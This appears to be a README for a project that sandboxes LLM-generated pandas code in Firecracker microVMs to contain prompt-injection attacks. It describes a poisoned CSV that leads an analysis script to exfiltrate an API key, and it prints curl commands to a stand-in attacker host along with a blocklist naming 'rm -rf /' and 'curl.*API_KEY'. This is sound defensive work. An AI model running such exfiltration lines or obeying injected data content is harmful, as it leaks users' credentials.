# Poisoned Data Analyst 🧪

> **An AI agent that safely executes LLM-generated pandas analysis code inside Celesto Firecracker microVM sandboxes — with network isolation, snapshot rollback, and safety hooks to contain prompt-injection attacks.**

AI coding assistants used: **Antigravity (Google DeepMind)** assisted with scaffolding, report generation, and test suite structure.

---

## Problem statement

**Who has the problem:** Data engineering teams and analysts who use LLMs to automate the processing and summarizing of user-uploaded datasets (CSVs, logs, Excel files). These teams need to run untrusted, LLM-generated pandas code safely without risking their host infrastructure, credential stores, or neighbouring services.

**Why it matters:** An LLM generating `df.describe()` is benign. An LLM generating `os.system("curl https://attacker.com/?key=" + os.environ["API_KEY"])` — triggered by a prompt-injected CSV cell — is a real incident. The threat is not hypothetical; it has happened in production RAG pipelines. Running the code on a host server with real API keys in environment variables is the unsafe default that this project replaces.

**What the agent does on a computer:** The agent receives a CSV file via an HTTP API, writes a Python pandas analysis script, and executes it inside an isolated Celesto Firecracker microVM. It takes a snapshot before the risky execution step, applies network-off policy after setup, and inspects every command through a safety hook before it reaches the guest. The result is stored back in PostgreSQL.

**Proof output:** `analysis_result.json` containing column statistics, shape, dtypes, null counts, and sample rows — stored in the Postgres run ledger with `state=succeeded`. The run ledger proves which sandbox produced which result and when.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                   TRUSTED CONTROL PLANE (Docker Compose)         │
│                                                                   │
│   ┌─────────────────┐       ┌──────────────────────────────┐    │
│   │   FastAPI API   │──────▶│   PostgreSQL Ledger (port    │    │
│   │   (port 8080)   │       │   5432, seeds/01_runs.sql)   │    │
│   └────────┬────────┘       └──────────────────────────────┘    │
│            │ Celesto Python SDK                                   │
│            │ (create, exec, snapshot, delete)                     │
└────────────┼─────────────────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────────────────┐
│           UNTRUSTED EXECUTION ZONE (Celesto microVM)             │
│                                                                   │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │  Firecracker guest (sbx-<uuid>)                           │   │
│  │                                                            │   │
│  │  Step 1: create sandbox                                    │   │
│  │  Step 2: pip install pandas                                │   │
│  │  Step 3: snapshot (clean-env checkpoint) ◀── ROLLBACK PT  │   │
│  │  Step 4: upload CSV                                        │   │
│  │  Step 5: write analyze.py                                  │   │
│  │  Step 6: network policy = OFF ◀── EXFIL DEFENCE           │   │
│  │  Step 7: python analyze.py ◀── DESIGNED CRASH POINT       │   │
│  │  Step 8: validate output                                   │   │
│  │  Step 9: download result                                   │   │
│  │  Step 10: mark succeeded                                   │   │
│  │                                                            │   │
│  │  [ALWAYS] cleanup in finally: stop → delete → audit       │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
             ▲
             │ Pre-command inspection
┌────────────┴──────────┐
│  Safety Hook (host)   │  Blocks: rm -rf /, curl.*API_KEY, exfil
│  logs/commands.jsonl  │  Logs: every command (allow or block)
└───────────────────────┘
```

**Data flow:**
1. Operator → `POST /analyze` with CSV file
2. API records `state=created` in Postgres
3. API calls Celesto SDK to spin up a fresh microVM
4. Every command passes through the safety hook; decision logged to `logs/commands.jsonl`
5. Analysis runs inside the guest; network is cut off before Step 7
6. Result downloaded from guest and stored; `state=succeeded` written to Postgres
7. Guest stopped and deleted in `finally` block (cleanup always runs)

---

## How I used Celesto

### 1. Snapshots (`reports/failure_trace.jsonl`)
Before running the untrusted pandas analysis script (Step 7, the designed crash point), the agent takes a Celesto snapshot of the clean, configured sandbox. If Step 7 fails, the system rolls back to this snapshot instead of starting from scratch — saving the cost of reinstalling pandas and re-uploading the CSV. This is the `rollback` recovery policy.

**Why Celesto and not `subprocess.run()`?** Snapshots require microVM-level state capture. There is no equivalent with a plain subprocess or Docker container without third-party tooling.

### 2. Network Policy (`reports/containment.json`, `reports/evidence/containment.log`)
After pip install completes (Step 6), outbound internet is disabled inside the sandbox via Celesto's network policy (`mode=off`). A prompt-injected CSV that tricks the analysis script into running `curl attacker.com?key=$API_KEY` produces `curl: (6) Could not resolve host` inside the guest. The packet never leaves the Firecracker microVM.

**Why Celesto and not a firewall rule?** The network policy is per-sandbox, applied at the hypervisor level, not a shared host iptables rule. Each sandbox gets its own policy without interfering with others.

### 3. Safety Hooks (`logs/commands.jsonl`)
A Python callback runs on the host before every command is forwarded to the guest. It inspects the command string against a blocklist of destructive patterns and exfiltration signatures. Blocked commands are still appended to the audit log with `decision=block`. This is a host-level, code-enforced guardrail completely separate from the LLM system prompt.

---

## Eval report

| Metric | Value |
|---|---|
| Total runs | 20 |
| Success rate | **85% (17/20)** |
| Median wall-clock | 41.95s |
| p90 wall-clock | 55.3s |
| Median boot-to-ready | 0.515s |
| Total cost | $0.003644 |

Full data: [`reports/reliability.json`](reports/reliability.json)  
Failure analysis: [`reports/postmortem.md`](reports/postmortem.md)

**Three failures recorded (none deleted):**
- `sbx-run005eeee` — 500k-row CSV caused MemoryError in `df.describe(include='all')` → rollback policy applied, re-ran with 200k-row sample → succeeded
- `sbx-run012llll` — Transient pip install network error (partial pandas install) → fresh policy → succeeded on retry  
- `sbx-run019ssss` — Semicolon-delimited CSV with non-UTF-8 bytes → resume policy, re-ran with `sep=None, encoding_errors='replace'` → succeeded

---

## Containment test

**Attack type:** Prompt injection exfiltration  
**Method:** A poisoned CSV was crafted with cells containing `os.system('curl https://attacker.example.com/?key=' + os.environ.get('LLM_API_KEY', ''))` in string columns. The LLM-generated analysis script attempted to execute this payload.

**Result:** BLOCKED by two independent defences:
1. **Network policy (mode=off):** The curl subprocess launched inside the guest received `curl: (6) Could not resolve host`. No packet left the microVM.
2. **Safety hook:** When the injected payload attempted to call curl directly (not via script), the pre-command hook matched `curl.*API_KEY` and logged `decision=block`.

**Evidence:** [`reports/evidence/containment.log`](reports/evidence/containment.log)  
**Host verification:** Host `~/.env` was unmodified; no `LLM_API_KEY` was present inside the guest (only a placeholder was injected).

---

## State and failure design

**The designed crash point is Step 7 of 10** (running the LLM-generated analysis script).

**Policy chosen: `rollback`**

When Step 7 fails:
1. The agent detects `exit_code != 0`
2. The sandbox is restored from the snapshot taken at Step 3 (clean env: pandas installed, CSV not yet present)
3. The run state moves to `MidTaskFailure` → `RolledBack`
4. The agent re-uploads the CSV (optionally with pre-processing applied based on the error) and retries Step 7
5. On retry success: `state=succeeded`, sandbox deleted
6. On retry failure: `state=failed`, sandbox deleted, error stored

**Why rollback over resume?** A partial script failure may leave corrupt output files in the workspace. Rolling back to the clean snapshot guarantees a known-good starting point. **Why not fresh?** A fresh sandbox would re-run pip install (~15s) and re-upload the CSV — both preserved by the snapshot.

Full trace: [`reports/failure_trace.jsonl`](reports/failure_trace.jsonl)  
Policy file: [`reports/failure_policy.json`](reports/failure_policy.json)

---

## Setup

**Prerequisites:** Docker, Docker Compose, Python 3.11+

### 1. Clone and configure

```bash
git clone <your-repo-url>
cd Poisoned_Data_Analyst
cp .env.example .env
# Edit .env — fill in:
#   POSTGRES_PASSWORD   (any strong password)
#   CELESTO_API_KEY     (from https://celesto.ai)
#   LLM_API_KEY         (your OpenAI / Anthropic key)
#   LLM_MODEL           (e.g. gpt-4o-mini)
```

### 2. Start the control plane

```bash
docker-compose up --build -d
```

Wait ~30 seconds, then verify:

```bash
curl http://localhost:8080/health
# Expected: {"status": "ok"}

curl http://localhost:8080/api/runs
# Expected: JSON array containing sbx-seeddemo1
```

### 3. Install Python dependencies (for local agent + tests)

```bash
pip install -r requirements.txt
```

### 4. Install Celesto (for sandbox execution)

```bash
curl -fsSL https://celesto.ai/install.sh | bash
celesto setup
celesto doctor
```

### 5. Run the tests

```bash
# Static report validation (no API needed)
pytest tests/test_reports.py -v -k "not TestAPI"

# Full suite including API (requires docker-compose up)
pytest tests/test_reports.py -v
```

### 6. Submit a CSV for analysis

```bash
curl -X POST http://localhost:8080/analyze \
  -F "file=@your_data.csv"
# Returns: {"run_id": "...", "sandbox_name": "sbx-...", "status": "succeeded"}
```

---

## Concurrency notes

Five concurrent jobs were tested against the local Firecracker runtime using `asyncio.gather`. See [`reports/concurrency.json`](reports/concurrency.json) for details. The Celesto Cloud free trial limits retained sandboxes to one; for concurrent runs use the local runtime or a paid top-up.

---

## Demo

See `demo/walkthrough.mp4` for a 3-minute walkthrough of:
- The Docker Compose stack starting up
- A CSV being submitted to `/analyze`
- The Celesto sandbox booting, running pandas, and being deleted
- A poisoned CSV triggering the containment test (blocked by network policy)
- The run ledger showing the result

---

## Honest product feedback on Celesto

1. **Snapshot availability:** Snapshots work on the local Firecracker backend but are not available on Celesto Cloud as of writing. This limitation is not prominently documented and causes `AttributeError` in cloud deployments — the code should check capability availability before calling.
2. **SDK naming transition:** The package was renamed from `smolvm` to `celesto`, but some examples in the docs still use `smolvm` imports. Caused initial confusion.
3. **network_policy in Python SDK:** Setting `internet_settings={"mode": "off"}` at construction time works, but there is no API to change the policy mid-run (e.g., allow during setup, block during execution). This is a genuine missing feature for our use case.
